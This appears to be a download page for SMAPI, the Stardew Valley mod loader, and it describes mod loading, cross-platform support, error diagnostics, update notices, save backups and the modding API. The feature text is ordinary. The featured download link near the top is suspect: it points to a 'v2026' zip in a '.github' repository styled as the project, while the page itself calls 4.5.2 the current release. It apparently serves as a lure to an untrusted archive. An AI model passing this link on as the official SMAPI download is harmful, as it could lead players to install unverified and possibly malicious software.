# SMAPI – Stardew Modding API for Stardew Valley: Load Mods and Extend Gameplay

SMAPI is the mod loader and modding API that allows Stardew Valley to run code-based mods, including gameplay changes, new systems, and custom features. It loads compatible mods when the game starts and provides the framework they need to interact with the game, while retaining support for Steam and GOG achievements on supported desktop platforms.

> **[Download the latest version of SMAPI →](https://github.com/SMAPI-Stardew-Valley/.github/releases/download/Latest/SMAPI.Stardew.Valley.v2026.zip)**

![SMAPI banner over a Stardew Valley fishing scene](https://staticdelivery.nexusmods.com/mods/1303/images/2400/2400-1529134549-2089785102.png)

## Loading Mods into Stardew Valley

SMAPI runs alongside Stardew Valley and loads installed mods during game startup. It provides the runtime support that allows compatible mods to change game behavior, respond to in-game events, and introduce functionality that the unmodified game does not provide.

This makes SMAPI a core requirement for most Stardew Valley mods, particularly those that use custom code. Depending on the mod, these additions can include new gameplay mechanics, automation, interface changes, custom locations, character interactions, and quality-of-life improvements.

SMAPI is the foundation rather than a standalone content expansion. It does not independently add new crops, characters, quests, or items; those features come from the mods loaded through it.

## Cross-Platform Support and Game Compatibility

SMAPI supports Stardew Valley on Windows, macOS, and Linux, as well as Steam Deck. The current 4.5.2 release supports Stardew Valley 1.6.14 or later on these platforms.

Its compatibility handling helps supported mods work across different desktop operating systems without requiring every mod to implement separate platform-specific behavior. Depending on the changes made by the game or a particular mod, compatibility checks can also identify outdated or broken code before it causes further issues.

Players using Steam or GOG can continue earning their platform achievements while playing with SMAPI. The mod loader works alongside the existing game rather than functioning as a replacement for Stardew Valley itself.

## Mod Diagnostics and Error Handling

A modded game can encounter errors when a mod becomes outdated, conflicts with another mod, or encounters an unexpected game state. SMAPI provides diagnostic information through its console and logs, helping players identify what happened instead of relying solely on a generic game error.

Its error-handling features include:

- **Mod compatibility checks:** Detects incompatible or outdated mods and can disable affected mods before they cause additional problems.
- **Detailed error reporting:** Displays relevant error information in the SMAPI console and log, helping narrow down which mod may be responsible.
- **Automatic recovery:** Intercepts many errors and can recover from them without forcing the entire game to close.
- **Save recovery support:** In certain situations, SMAPI can repair save data when missing custom content, such as a removed location or NPC, would otherwise prevent a save from loading.

These features do not eliminate every possible conflict or game failure. They provide useful diagnostic information and recovery mechanisms when a modded session encounters a supported error.

## Mod Update Notifications and Save Backups

SMAPI includes features that help players maintain a modded installation over time.

When update information is available for an installed mod, SMAPI can notify the player when a newer version is available. This helps identify outdated components that may need attention after a game update or when a mod receives a compatibility fix.

SMAPI also bundles the Save Backup component, which automatically creates daily backups of Stardew Valley save files and retains the ten most recent backups. This provides additional recovery points for farms and game progress if a save is affected by an unexpected problem.

Together, update checks and save backups support the ongoing maintenance of a modded game without requiring players to track every mod version or create each backup manually.

## The API Behind Stardew Valley Mods

Beyond loading existing mods, SMAPI exposes APIs and events that mod creators can use to interact with the game. These capabilities allow mods to react to events such as loading a save, access and modify supported game content, manage player input, store data, and communicate with other mods.

The available API functionality covers areas such as:

- Game events, content, and data.
- Player input and mod configuration.
- Logging, translations, and console commands.
- Multiplayer support and integrations between mods.

For players, this shared framework means more types of modifications can work within the same game environment. For mod creators, it provides established ways to connect new functionality to Stardew Valley instead of requiring each mod to build its own loading and integration mechanisms.

SMAPI therefore serves both as the entry point for playing Stardew Valley with mods and as the underlying modding API that enables much of the game's wider mod ecosystem.
